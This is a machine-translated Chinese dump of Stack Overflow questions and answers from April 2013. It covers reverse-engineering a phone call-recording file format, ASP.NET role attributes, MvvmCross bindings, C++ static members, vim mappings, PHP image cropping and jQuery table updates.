0001-ed70:  28 71 63 90-c9 2a 13 40-1f 6a 80 97-88 b6 61 82  (qc..*.@ .j....a.
0001-ed80:  8e 95 41 67-78 8a d0 46-50 d0 74 06-1a b8 00 00  ..Agx..F P.t.....
0001-ed90:  14 0e e3 29-2d 09 87 a7-52 17 13 19-b0 80 da b0  ...)-... R.......
0001-eda0:  02 4c 39 e9-03 d2 30 95-7a b2 0b 12-0e 7b 0a 00  .L9...0\. z....{..
0001-edb0:  34 f0 e9 a9-35 a8 9f f8-44 81 5c 24-3f 11 97 52  4...5... D.\$?..R
0001-edc0:  cb 1a 64 86-21 14 5d d9-93 b1 1a 32-ad 49 07 00  ..d.!.]. ...2.I..
0001-edd0:  66 aa c2 00-96 3a 91 00-2b 05 12 02-14 00 70 00  f....:.. +.....p.
0001-ede0:  00 00 43 45-15 75 e4 51-00 18 00 00-cc 00 0b 0b  ..CE.u.Q ........
0001-edf0:  00 00 00 00-00 00 00 00-00 00 3f 00-3f 00 10 27  ........ ..?.?..'
0001-ee00:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ee10:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ee20:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........ 
```

例如，寻找定期重复的**CE模式，该模式在整个文件中都会发生变化。**一些观察到的间隔是 159 和 192 字节。CE 标志并非始终存在于整个文件中；有时它表现为 cE 或其他。很明显，在整个文件中或多或少存在恒定长度的帧。

## 以 PCM 播放文件

合理恒定的长度/播放时间关系暗示了一种简单的编码方案。使用中最简单的编码方案是 PCM - 每个采样间隔一个样本，不变。

如果您使用 Linux 命令强制将文件作为脉冲编码调制文件（即`wav`Windows 世界中的文件）播放

```
aplay -c 2 -f S16_LE Sun_Apr_2013__18_11_58.vm 
```

你会听到不同的、相当均匀的噪音的不同阶段。它们可能是由上面讨论的不同帧长度引起的。但是，如果这只是一个大端/小端混合，则没有任何语音或任何类似的迹象。这表明这里使用了更高级的编码方案。

## 文档

可用的文档提示了 AMR 编解码器的使用。但是，它说这是用于录音（这可能是作为听写功能阅读的）。在我看到的任何英文文档中都没有提到录音电话，在粗略的谷歌搜索中也没有提到。通话录音可能是区域启用的功能。

## 结论

大量零的存在表明此格式尚未针对大小进行优化。常规 AMR 文件不包含此类连续为零的区域。

二进制数据中可变长度帧的存在表示高级格式。结合零，这也或多或少地排除了任何类型的加密有效负载（因为这也会混淆零区域）。

录音长度与文件大小之间相对恒定的比率表明这是一种相对简单的格式。然而，当以 PCM 播放时，实际录音中没有任何可听见的伪影，这表明格式更为复杂。

值得注意的是，飞利浦还生产使用专有文件格式的听写记录器，`.dss`. 这些被宣传为针对小文件大小进行了优化-不适用于这些文件。

因此，我愿意打赌这是一个具有非标准标题的 AMR 编码文件，并且可能整体上也是一种非标准文件格式。

## 如何继续这项调查

*   在您购买此手机的地区（和语言）中寻找其他人的体验。看起来，通话录音功能在美国和英国型号中不存在。
*   写信给飞利浦询问格式，以及如何在 PC 上播放。这实际上可能是最简单的路线
*   调查单个帧以发现您拥有的帧与 AMR 或类似编解码器中的帧应该是什么样子之间的任何相似之处
*   只需使用模拟链接记录消息并节省大量时间 :)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-17T15:14:11.417

试试[MediaInfo](http://mediainfo.sourceforge.net)。它可以告诉您地球上几乎所有音频和视频文件的编解码器和格式。如果这不起作用，请将文件上传到某个地方，我可以看看。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-23T20:29:54.760

疯狂的远景：如果它是原始数据（133 kB / 10 秒看起来有点像未压缩的 16 位单声道 IIRC），那么您可以尝试编写一个程序来读取一些数据并绘制图表。如果它看起来像一条足够漂亮的曲线，那么就是将该程序转换为输出声音文件而不是绘制曲线的问题 - 我很确定周围有用于此类事物的库，适用于各种编程语言。

# asp.net-mvc-3 - MVC 配置授权角色值和强类型角色

> ID：15998385
> 
> 赞同：4
> 
> 时间：2013-04-14T11:08:04.770
> 
> 标签：asp.net-mvc-3, authorize-attribute

为了为特定角色授权控制器，控制器类需要以下属性：

```
[Authorize(Roles = "SampleRole")] 
```

这需要在 Controller 上硬编码角色名称，这似乎不是一个灵活的解决方案。我的问题是，是否可以在 web.config 中为该角色指定值并在控制器中使用该键？

```
<appSettings>
    <add key="SampleRoleKey" value="SampleRole" /> 
    ...
</appSettings> 
```

在控制器中，

```
[Authorize(Roles = "SampleRoleKey")] 
```

另一个问题是，我们可以使用强类型角色来授权控制器吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:16:52.777

使用带有 public const-s 的静态类：

```
public static class Roles
{
    public const string SampleRoleKey = "SampleRole";
} 
```

创建从 AuthorizeAttribute 派生的自定义 MyAuthorizeAttribute 以具有可以处理字符串数组的属性，然后：

```
[MyAuthorize(MyRoles = new[]{ Roles.SampleRoleKey }] 
```

# c# - 将 UITableView 标题绑定到模型

> ID：15998388
> 
> 赞同：1
> 
> 时间：2013-04-14T11:08:40.880
> 
> 标签：c#, xamarin.ios, mvvmcross

我尝试做的是创建一个带有 TextBox、Button 和 TableView 的屏幕。我已经创建了 xib，添加了元素并为按钮/文本框和 TableView 创建了出口。

我确实有一个核心项目，它是一个 PCL，并且包含 ViewModel：

```
public class MainViewModel : MvxViewModel
{
    public MainViewModel()
    {
        CardSets = new ObservableCollection<CardSet>
            {
                new CardSet {Name = "First Entry", Description = "First Entry Description"},
                new CardSet {Name = "Second Entry", Description = "Second Entry Description"}
            };

    }

    private ObservableCollection<CardSet> _sets;
    public ObservableCollection<CardSet> CardSets { 
        get{
            return _sets;}
        set{
            _sets=value;
        }} 
```

实际上为了测试，我立即开始使用列表中的模型。该模型如下所示：

```
public class CardSet
{
    public string Id { get; set; }
    public string Name { get; set; }
    public string Description { get; set; }
} 
```

比我在控制器的 .cs-File 上创建绑定：

```
[MvxViewFor(typeof(MainViewModel))]
public partial class TestViewController : MvxViewController
{

    public TestViewController () : base ("TestViewController", null)
    {
    }

    public override void ViewDidLoad ()
    {
        base.ViewDidLoad ();

        var tableSource = new CardSetTableViewSource(ListViewOutlet);

        this.AddBindings(new Dictionary<object, string>()
                         {
            {tableSource, "ItemsSource CardSets; SelectionChangedCommand SearchCardSetsCommand"}
        });

        ListViewOutlet.Source = tableSource;
        ListViewOutlet.ReloadData();
    }
} 
```

据我了解，我将 TableView 的 ItemsSource（不小心称为 ListViewOutlet .. XD）绑定到我的 ViewModels CardSets-Property。

CardSetTableViewSource 如下所示：

```
public class CardSetTableViewSource : MvxTableViewSource
{
    static readonly NSString CellIdentifier = new NSString("ClientCell");

    public CardSetTableViewSource(UITableView tableView) 
        : base(tableView)
    {
    }

    protected override UITableViewCell GetOrCreateCellFor(UITableView tableView, NSIndexPath indexPath, object item)
    {
        UITableViewCell cell = tableView.DequeueReusableCell(CellIdentifier);
        if (cell == null)
        {
            cell = new CardSetTableViewCell(UITableViewCellStyle.Subtitle, CellIdentifier);
            cell.Accessory = UITableViewCellAccessory.DisclosureIndicator;
        }
        return cell;
    }

    public override string TitleForHeader(UITableView tableView, int section)
    {
        return string.Empty;
    }
} 
```

和单元实现：

```
public class CardSetTableViewCell : MvxTableViewCell
{
    public const string BindingText = @"TitleText Name";

    public static readonly MvxBindingDescription[] BindingDescriptions 
        = new []
    {
        new MvxBindingDescription()
        {
            TargetName = "TitleText",
            SourcePropertyPath = "Name"
        },

    };

    public CardSetTableViewCell(UITableViewCellStyle cellStyle, NSString cellIdentifier)
        : base(BindingDescriptions, cellStyle, cellIdentifier)
    {
    }
} 
```

所以现在的问题是：标题未显示在列表项中。实际上，绑定似乎在列表显示拖曳项目时起作用。我的绑定也适用于 TextBox 和 Button。所以这不是问题。在调试之后。输出：

```
2013-04-14 13:03:43.178 KaptaiOS[91851:c07] mvx: Diagnostic:   0.06 Showing ViewModel MainViewModel
2013-04-14 13:03:43.180 KaptaiOS[91851:c07] TouchNavigation: Diagnostic:   0.06 Navigate requested
2013-04-14 13:03:43.287 KaptaiOS[91851:c07] MvxBind: Diagnostic:   0.17 Receiving setValue to 
2013-04-14 13:03:43.296 KaptaiOS[91851:c07] MvxBind: Diagnostic:   0.18 Receiving setValue to System.Collections.ObjectModel.ObservableCollection`1[KaptaCore.Model.CardSet]
2013-04-14 13:03:43.298 KaptaiOS[91851:c07] MvxBind: Diagnostic:   0.18 Receiving setValue to Cirrious.MvvmCross.ViewModels.MvxCommand
2013-04-14 13:03:43.306 KaptaiOS[91851:c07] MvxBind: Warning:   0.19 Failed to create target binding for from Name to TitleText
2013-04-14 13:03:43.308 KaptaiOS[91851:c07] MvxBind: Warning:   0.19 Failed to create target binding for from Name to TitleText 
```

知道有什么问题吗？我在 Mac 上的 Xamarin Studio 中运行所有这些东西。我使用最新的稳定 XS。MvvmCross 构建大约 1 周大。

我已经添加了一个 LinkerIncludePlease.cs-File 来添加 Name-Property 的使用。但是当我在调试模式下在模拟器中运行链接器完全禁用时，这应该不是问题。

* * *

更新：

在阅读了一些教程并观看了一些视频后，我确实有一个解决方案：http: [//opendix.blogspot.ch/2013/04/binding-viewmodel-to-simple-uitableview.html](http://opendix.blogspot.ch/2013/04/binding-viewmodel-to-simple-uitableview.html)

续我可以说：当你只想展示一个很简单的UITableView时，那就用“MvxStandardTableViewSource”-class而不是自己写一个TableViewSource/cells。当您需要自定义单元格时，请观看 stuart 建议的视频。您必须为单元创建一个 .xib 文件，并在自定义单元实现中实现绑定。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T20:09:40.000

在我看来，您需要创建一些自定义表格单元格并绑定它们。

对于绑定表格单元格，我建议您查看[http://slodge.blogspot.com/2013/01/uitableviewcell-using-xib-editor.html](http://slodge.blogspot.com/2013/01/uitableviewcell-using-xib-editor.html)

此演示的代码已更新到 v3：[https ://github.com/slodge/MvvmCross-Tutorials/tree/master/MonoTouchCellTutorial](https://github.com/slodge/MvvmCross-Tutorials/tree/master/MonoTouchCellTutorial)

除此之外：

*   有一个很大的表格演示：[https ://github.com/slodge/MvvmCross-Tutorials/tree/master/Working%20With%20Collections](https://github.com/slodge/MvvmCross-Tutorials/tree/master/Working%20With%20Collections)
*   Dilbert 样本显示了“标准”细胞类型的使用 - [https://github.com/slodge/MvvmCross-Tutorials/tree/master/DailyDilbert](https://github.com/slodge/MvvmCross-Tutorials/tree/master/DailyDilbert)

# c++ - 不能增加静态变量

> ID：15998395
> 
> 赞同：4
> 
> 时间：2013-04-14T11:10:14.437
> 
> 标签：c++

你能帮我理解为什么我不能增加静态变量吗？我面对这个： *error LNK2001: unresolved external symbol "private: static unsigned int Counter::m_curCounters" (?m_curCounters@Counter@@0IA)*

**计数器.cpp**

```
#include "counter.h"

static unsigned int m_curCounters = 0;

Counter::Counter(const char* p){
    ...
    m_curCounters++;
}

Counter::Counter(){
    ...
    m_curCounters++;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T11:16:44.520

我认为您已在此处`m_curCounters`声明`counter.h`并在 cpp 中创建了一个新的本地静态文件。但是通过在 cpp 中将类静态定义为`unsigned int Counter::m_curCounters = 0;`

现在，当您尝试使用本地静态时，编译器会优先考虑链接器稍后找不到的类静态

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-14T11:13:11.590

我想你已经`m_curCounters`在柜台声明了。
然后你需要将它定义为

```
unsigned int Counter::m_curCounters = 0; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T11:14:08.463

既然你给了我们一半的代码，是时候进行一些心理调试了！这是我认为您在头文件中的内容：

```
class Counter
{
    static unsigned int m_curCounters;
}; 
```

因此，在您的 .cpp 文件中，您忘记了在类的范围内定义静态变量。你需要：

```
unsigned int Counter::m_curCounters = 0; 
```

# python - Python浮点格式：固定总位数

> ID：15998396
> 
> 赞同：4
> 
> 时间：2013-04-14T11:10:15.257
> 
> 标签：python, numpy, floating-point, fixed-width

我正在保存一些数据，`numpy.savetxt(path,array,fmt="%.2f %.2f %.2f %.2f %.2f")`我希望文本文件的格式很好。我想将浮点数限制为一定数量的数字，如下所示：

```
11.2345 -> 11.2
1.2345 -> 1.23 
```

目前我得到：

```
11.2345 -> 11.23
1.2345 -> 1.23 
```

这会破坏文本文件的布局。

我知道关于 SO 有几个类似的问题，但是我无法将任何解决方案应用于`numpy.savetxt()`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:19:50.490

尝试使用`fmt="%9.2f"`. 这似乎给了我很好的结果：

```
 25.72    433.54    135.69    898.93
   177.46    120.65    954.13    480.82
   963.45    774.35    289.08     93.64 
```

# vim - 我的电力线不工作

> ID：15998399
> 
> 赞同：0
> 
> 时间：2013-04-14T11:10:17.313
> 
> 标签：vim, vim-powerline

系统：Win7专业服务包1 vim版本：7.3

大家好，我通过将文件复制到我的 vim 来安装 powerline

> d:\Vim\vimfiles\plugin\
> 
> d:\Vim\vimfiles\doc\
> 
> d:\Vim\vimfiles\autoload\

并将我的 vimrc 设置为 github 说明：[https://github.com/Lokaltog/vim-powerline](https://github.com/Lokaltog/vim-powerline) 。但是当我重新启动我的 vim 时，我收到以下错误：

> 处理 "*" 的 VimEnter 自动命令时检测到错误：E194: 没有替代文件名来替代 '#':runtime autoload/Pl#UpdateStatusline.vim 按 Enter 或键入命令继续无效的电力线主题！请检查您的主题和配色方案设置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T15:04:23.087

该错误命令将自动加载函数语法 ( `foo#bar()`) 与文件路径 ( `foo/bar.vim`) 混合在一起；它应该是

```
:runtime autoload/Pl/UpdateStatusline.vim 
```

# php - 获取 Google Plus 本地商家页面的 +1 数量

> ID：15998410
> 
> 赞同：0
> 
> 时间：2013-04-14T11:12:04.567
> 
> 标签：php, ajax, google-api, google-plus, google-plus-one

好的，所以我知道我可以根据其网站 URL 获得 Google Plus 页面的 +1 数量，但是我想获得我的 Google Plus 本地业务页面的 +1 数量，最好使用 AJAX（jQuery AJAX 是很好）或 PHP 任何建议都会很棒

# css - Internet Explorer 9 上的 Foundation 4

> ID：15998411
> 
> 赞同：0
> 
> 时间：2013-04-14T11:12:09.037
> 
> 标签：css, internet-explorer, zurb-foundation, quirks-mode

我使用[Foundation 4 CSS 框架](http://foundation.zurb.com/docs/support.html)创建了一个网站——在 Chrome、Opera、Firefox 上一切都很完美……但在 Internet Explorer 9 上却是一场灾难。

当我**从 quirks 模式切换到 IE9 模式**时，它会有所帮助——但必须手动完成。我可以强制 IE 使用适当的模式吗？任何想法如何解决这个问题？基金会网站以某种方式在 IE9 中运行。支持 IE9，但我的以某种方式进入了怪癖模式，我不知道为什么 - 尝试了一些技巧（添加与[Foundation 站点](http://foundation.zurb.com/docs/support.html)上相同的 HTML 注释）但都失败了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:24:58.050

Quirks 模式由 doctype 控制。这是 HTML5 文档类型的样子，应该让您进入标准模式：

```
<!DOCTYPE html> 
```

维基百科有一个很好的图表显示什么触发和不触发怪癖模式： [http ://en.wikipedia.org/wiki/Quirks_mode#Comparison_of_document_types](http://en.wikipedia.org/wiki/Quirks_mode#Comparison_of_document_types)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-09T08:12:15.660

还...

您可以在元标记中强制边缘模式：

```
<meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
```

如果从网络上的本地 Web 服务器测试站点，请确保在“工具 > 兼容性视图设置”中禁用“在兼容性视图中显示 Intranet 站点”。

# python - 随机技能在 Python 文本 rpg 中未按预期运行

> ID：15998414
> 
> 赞同：1
> 
> 时间：2013-04-14T11:12:26.777
> 
> 标签：python, random, text-based

我在处理基本技能提升时遇到了一些麻烦。现在代码看起来像

```
huntluck = 11
huntskill = 1

def hunt(self):
    global result, huntluck, huntskill

    hunting = random.randint(0, huntluck)

    if hunting == 0:
        result = "You couldn't find anything."
    elif hunting >=10:
        huntluck += 1
        huntskill += 1
        result = ("You succeeded in hunting. Your hunting skill increases. " +
        "(%s)" %huntskill) 
```

运气和技能是分开的，因为我希望猎杀1级成功的机会是十分之一，但我也想正确地发挥技能。这是一种非常笨拙的方法，但这只是问题的一部分。

一切都打印正确，但是当用户成功时，技能水平大约有 50/50 的机会不会上升。

> 你打猎成功了。你的狩猎技能增加。(2)
> 
> 你打猎成功了。你的狩猎技能增加。(2)
> 
> 你打猎成功了。你的狩猎技能增加。(3)
> 
> 你打猎成功了。你的狩猎技能增加。(3)
> 
> 你打猎成功了。你的狩猎技能增加。(3)
> 
> 你打猎成功了。你的狩猎技能增加。(4)

我打算每次玩家成功狩猎时提高技能水平。显然这不会发生......

你能看出我做错了什么吗？我该如何解决？我怎样才能把事情做得更好？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T11:17:53.977

`result`您只需为if`hunting`等于 0*或*大于 9设置一个新值。如果`hunting`等于 1-9，则`result`保留旧值，然后重新打印。

改变你的`hunting`测试：

```
if hunting < 10:
    result = "You couldn't find anything."
else:
    huntluck += 1
    huntskill += 1
    result = ("You succeeded in hunting. Your hunting skill increases. " +
    "(%s)" %huntskill) 
```

# ruby - 将哈希数组转换为 csv

> ID：15998415
> 
> 赞同：1
> 
> 时间：2013-04-14T11:12:34.947
> 
> 标签：ruby, ruby-on-rails-3

我有一个哈希数组，如下所示：

```
[{:id => 1, :name => "test", :status => "active", :desc => "test desc"}, {...}] 
```

我需要将其转换为 CSV。我意识到我可以使用`CSV.generate`（我使用的是 ruby​​ 1.9）来生成 CSV。

将散列转换为数组的第一个是一个想法`to_a`吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:18:23.427

```
arr = [{:id => 1, :name => "test", :status => "active", :desc => "test desc"},{:x => 4,:l => 7}]
arr = arr.each_with_object([]) { |i,mem| mem << i.to_a  }.flatten
p arr 
```

***输出：***

```
[:id, 1, :name, "test", :status, "active", :desc, "test desc", :x, 4, :l, 7] 
```

**更新：**

```
 require 'csv'
  arr = [{:id => 1, :name => "test", :status => "active", :desc => "test desc"},{:x => 4,:l => 7}]
  arr = arr.each_with_object([]) { |i,mem| mem << i.to_a}.flatten.to_csv
  p arr 
```

***输出：***

```
"id,1,name,test,status,active,desc,test desc,x,4,l,7\n" 
```

# selenium - Fitnesse + WebDriver：任何可行的解决方案？

> ID：15998424
> 
> 赞同：0
> 
> 时间：2013-04-14T11:13:34.100
> 
> 标签：selenium, webdriver, selenium-webdriver, fitnesse

您能否告诉我是否有任何尝试整合 Fitnesse 和 Selenium WebDriver？我正在寻找类似 Selenesse ( [https://github.com/marisaseal/selenesse](https://github.com/marisaseal/selenesse) ) 的东西，但是对于 WebDriver，而不是“旧”的 Selenium。

谢谢，浣熊

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:07:18.643

你可以看看 Xebium：http: [//xebia.github.io/Xebium/](http://xebia.github.io/Xebium/)。如果 Se 1.0，它使用 WebDriver 代替。

我确实建议您最终对驱动程序拥有更多的所有权。关键字驱动的测试可以快速编写，但长期维护可能是个问题。所以从 Xebium 开始，然后考虑编写自己的驱动程序。

# xaml - 将复选框绑定到 LongListSelector

> ID：15998428
> 
> 赞同：3
> 
> 时间：2013-04-14T11:13:55.603
> 
> 标签：xaml, mvvm, windows-phone-8, 2-way-object-databinding

我正在尝试在 LongListSelector 中绑定一些 CheckBox。它们绑定，并且在呈现视图时选中/取消选中正确的复选框，但我无法通过选中/取消选中复选框来修改我的基础对象。

```
<Grid Grid.Row="3">
<phone:LongListSelector ItemsSource="{Binding PlaceOfInterestCategories}">
    <phone:LongListSelector.ItemTemplate>
        <DataTemplate>
            <CheckBox IsChecked="{Binding IsSelected, Mode=TwoWay}" Content="{Binding Name}"/>
        </DataTemplate>
    </phone:LongListSelector.ItemTemplate>
</phone:LongListSelector> 
```

我的 ViewModel 中有以下代码：

```
private ObservableCollection<PlaceOfInterestCategory> _placeOfInterestCategories;

public ObservableCollection<PlaceOfInterestCategory> PlaceOfInterestCategories
{
    get { return _placeOfInterestCategories; }
    set
    {
        if (_placeOfInterestCategories != value)
        {
            _placeOfInterestCategories = value;

            OnPropertyChanged();
        }
    }
}

public event PropertyChangedEventHandler PropertyChanged;

[NotifyPropertyChangedInvocator]
protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
{
    var handler = PropertyChanged;
    if (handler != null) handler(this, new PropertyChangedEventArgs(propertyName));
} 
```

-

```
[DataContract]
public class PlaceOfInterestCategory
{
    [DataMember]
    public int Id { get; set; }

    [DataMember]
    public string Name { get; set; }

    [DataMember]
    public bool IsSelected { get; set; }
} 
```

我试图订阅 CollectionChanged 事件，但它没有被解雇。

我总是可以在我的代码隐藏中处理 Checked 和 Unchecked，但我宁愿不处理，而是在我的视图模型中处理所有内容。

对于如何使绑定正常工作，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T20:15:31.417

使 PlaceOfInterestCategory 实现 INotifyPropertyChange 并调用`OnPropertyChanged()`属性设置器。当您在视图中绑定到可观察集合的项目时，它们是 PlaceOfInterestCategory，它们应该实现`INPC`. 您是否尝试在设置器中设置断点以查看在您选中复选框时属性是否实际更新？是没有设置它们还是没有反映在您的 UI 中？

# android - 将消息拉到android应用程序

> ID：15998432
> 
> 赞同：1
> 
> 时间：2013-04-14T11:14:20.057
> 
> 标签：android, android-service, android-permissions

有谁知道我如何将 SMS 消息拉到应用程序？（确切地说是短信或 WhatsApp）我在 google 上找不到正确的权限... =\

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:31:15.963

您可以使用 READ_SMS 权限并使用[此处](https://stackoverflow.com/q/848728/1069068)详述的代码轻松获取 SMS 。

WhatsApp 是第三方应用程序，他们不提供任何 API、服务或内容提供商来检索他们的消息。你不可以做这个。

# php - 使用各种扩展名保存图像

> ID：15998433
> 
> 赞同：0
> 
> 时间：2013-04-14T11:14:23.470
> 
> 标签：php, jquery, image, jcrop

我`jcrop`在我的 Wordpress 项目中使用。我想知道如何使用原始扩展名保存图像。就像我的代码只适用于`jpg`图像。我将裁剪的图像保存到服务器。这是我的PHP代码：

```
if(isset($_POST['saveCrop']))
{

    $targ_w = $targ_h = 150;
    $jpeg_quality = 90;
    $src = plugins_url( "employee/uploads/".$_POST['imgName'] , dirname(__FILE__) );
    $img_r = imagecreatefromjpeg($src);
    $dst_r = ImageCreateTrueColor( $targ_w, $targ_h );
    imagecopyresampled($dst_r,$img_r,0,0,$_POST['x'],$_POST['y'],
    $targ_w,$targ_h,$_POST['w'],$_POST['h']);

    header('Content-type: image/jpeg');
    @imagejpeg($dst_r, $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/employee/uploads/".$_POST['imgName'], $jpeg_quality);
    //imagejpeg($dst_r,null,$jpeg_quality);

} 
```

如果我尝试使用`png`图像，我会得到一个黑色的。同样的事情发生在`gif`. 我怎样才能让它与所有扩展一起工作并使用它的原始扩展保存（jpg 代表 jpg，png 代表 png）。 **更新::** **好的..为了创建 png 文件，我正在尝试这段代码。我确定我做错了什么：* *

```
$img_r = imagecreatefrompng($src);
$dst_r = ImageCreateTrueColor( $targ_w, $targ_h );

imagecopyresampled($dst_r,$img_r,0,0,$_POST['x'],$_POST['y'],
$targ_w,$targ_h,$_POST['w'],$_POST['h']);

header('Content-type: image/png');
@imagepng($dst_r, $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/employee/uploads/".$_POST['imgName'], $jpeg_quality); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:04:48.797

```
<?php
    $imageObject = imagecreatefromjpeg($imageFile); //Your jpg image created with your code
    imagegif($imageObject, $imageFile . '.gif');
    imagepng($imageObject, $imageFile . '.png');
    imagewbmp($imageObject, $imageFile . '.bmp');
?> 
```

# windows - 如何配置 Windows 的“GUI 没有响应”对话框？

> ID：15998437
> 
> 赞同：0
> 
> 时间：2013-04-14T11:14:36.013
> 
> 标签：windows, multithreading, customization, multilingual

在这些罕见的情况下，使用可能损坏的磁盘执行长 I/O 操作，我将鼠标光标更改为 Hour Gloss。

但是，如果用户继续点击，窗口会显示“GUI 没有响应”对话框：

![](https://i.stack.imgur.com/upylr.png)

我需要阻止此对话框中的“关闭程序”选项。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T03:13:31.417

我认为最好的方法是在不同的线程中执行您的 IO 操作并禁用您的 GUI 按钮（并且可能添加一些进度条或加载屏幕，类似的东西）。当 IO 线程完成工作时，它可以通知您的 UI 并且用户可以继续工作。

最好的问候，佩德罗·甘多拉

# perl - 如何在 vim 中启用 map 命令？

> ID：15998438
> 
> 赞同：0
> 
> 时间：2013-04-14T11:14:42.467
> 
> 标签：perl, vim, perl-tidy

仅当文件类型为“perl”时如何启用映射命令？

就像是：

```
if(&ft=='perl')
  map ,pt <ESC>:%! perltidy<CR>
endif 
```

但它不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:46:40.980

1.  Create the file `~/.vim/after/ftplugin/perl.vim`.

2.  Put this line in that file:

    ```
    nnoremap <buffer> ,pt <ESC>:%! perltidy<CR> 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:34:42.250

我的`.vimrc`. 第一个为任何“perl”文件类型设置“tab”单元，第二个`perltidy`使用`_t`键盘快捷键运行。这很多没有给你确切的答案，但肯定会给你一些指示：

```
autocmd FileType perl set tabstop=4|set shiftwidth=4|set expandtab|set softtabstop=4
nnoremap <silent> _t :%!perltidy -q<Enter>
vnoremap <silent> _t :!perltidy -q<Enter> 
```

`.vimrc`在过去 5 年多的时间里，我一直在使用这些设置。功劳归于提出这些命令的人。我没有做出上述命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-05T13:31:39.843

我找到了更短的方法。

将此行添加到您的 ~/.vimrc

```
au FileType perl nnoremap <buffer> _t <ESC>:%! perltidy<CR> 
```

# design-patterns - 装饰器设计模式问题

> ID：15998441
> 
> 赞同：1
> 
> 时间：2013-04-14T11:15:09.000
> 
> 标签：design-patterns

我正在为使用装饰器模式的正确性而苦苦挣扎。让我们以暗黑破坏神2游戏为例。有一些物品（例如）剑，您可以用珠宝装饰，剑会发生变化，例如更多的攻击点或剑名修改。所以从这个角度来看，剑是一个可以被装饰的具体物体，而珠宝则是装饰者。但是珠宝也可以作为独立的、独立的物品保留，它们也有名称、描述和其他说明符。如何解决这个问题？我想要一个独立的“宝石”，可以得到他的名字，描述，但我也可以用这颗宝石装饰一些剑。请注意，jevel 和剑都有共同的说明符，例如独立的名称或描述。一边用jevel装饰剑，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:31:11.043

珠宝不应该是装饰器，因为它们不代表相同的功能，即剑。但是，您可以使用`SwordWithJewels`, 或伪代码：

```
interface ISword { Stab(); }
class Sword : ISword { Stab();  }
class SwordWithJewels : ISword { Stab(); } 
```

`SwordWithJewels`应该在构造过程中直接或间接通过拥有它们的另一个对象将珠宝作为参数，并使用该信息来计算命中强度或名称或您需要的任何内容。

但请注意，这只是一个选项，根据上下文可能会有些过大。如果您将珠宝视为库存项目，那么使用其他方法可能更有意义（我故意避免使用模式一词，因为从“我需要为此使用某种模式”的想法开始通常会导致错误的代码）。只需遍历库存项目列表并让它们中的每一个从命中中添加或删除强度点也可能有意义，这更类似于访问者（如果您想要一个熟悉的名字）。

# php - 如何循环并写入表格单元格

> ID：15998442
> 
> 赞同：0
> 
> 时间：2013-04-14T11:15:11.157
> 
> 标签：php, javascript, jquery, html

我正在尝试将股票价格写入表格单元格。现在它正在循环并只写最后一个价格。我想将价格写入表格中的每个#price 单元格。这就是我所拥有的：

```
$(document).ready(function(){

  var updater = setTimeout(function(){
      $.ajax({  
        url: '../html/update.php',  
        success: function(data) { 
          var resp = jQuery.parseJSON(data); 
          var len = resp.price.length;

          for(var i=0; i<len; i++){

                  $('#price').html(resp.price[i].price);

          }
        }
      });
  },60);

});

<?php foreach ($shares as $row): ?>

        <tr >
        <td><?php echo $row["symbol"];?></td>
        <td><a href="extended_info.php?id=<?=$row["symbol"]?>"><?php echo $row["name"];?></a></td>
        <td style="text-align: right;"><?php echo $row["shares"];?></td>
        <td id="price" style="text-align: right;">$ </td>
        <td style="text-align: right;"><?php 
        $change = number_format($row["change"],2);
        echo sprintf( "%+1.2f", $change );
        echo "   ( ";
        echo $row["pct"]; 
        echo "   )";
        ?></td>
        <td style="text-align: right;">$ <?php echo number_format($row["dayGain"],2);?>  </td>    
        <td style="text-align: right;">$ <?php echo number_format($row["total"],2);?></td>
        </tr>

<?php endforeach; ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:36:01.597

您需要为 update.php 回复的每一行确定要更新的正确表行。

在你的 JavaScript 中试试这个：

```
$('[data-symbol="'+resp.price[i].symbol+'"]').html(resp.price[i].price); 
```

这在 PHP 中：

```
<td data-symbol="<?=$row['symbol']?>" style="text-align: right;">$ </td> 
```

假设每个股票`symbol`都是唯一的，您将能够识别正确的表格单元格以更新股票价格。此外，使用这些`data-*`属性可以使您的标记符合标准。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T13:24:38.587

因为你已经设置了一个 id="price" 像这样：

```
<td id="price" style="text-align: right;">$ </td> 
```

for 循环的每次迭代（在 jQuery 部分中）始终为同一个元素设置值（这是 dom 中的最后一个元素）。这是因为 id="price" 不是唯一的，并且 jQuery 选择 dom 中具有此 id 的最后一个元素被认为是唯一的。

在我看来，有两种解决方案：

